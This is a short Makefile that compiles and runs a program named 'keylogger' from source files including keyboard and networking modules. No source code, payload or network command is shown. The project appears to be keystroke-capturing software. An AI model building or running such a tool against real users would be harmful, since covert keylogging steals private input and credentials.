CC = gcc
EXEC = keylogger
CFLAGS = -Wall -O2

${EXEC}: main.c keylogger.c keylogger.h keyboard.c keyboard.h net.c net.h
	${CC} ${CFLAGS} -o ${EXEC} main.c keylogger.c keyboard.c net.c net.h

clean:
	rm ${EXEC}

exec: ${EXEC}
	./${EXEC}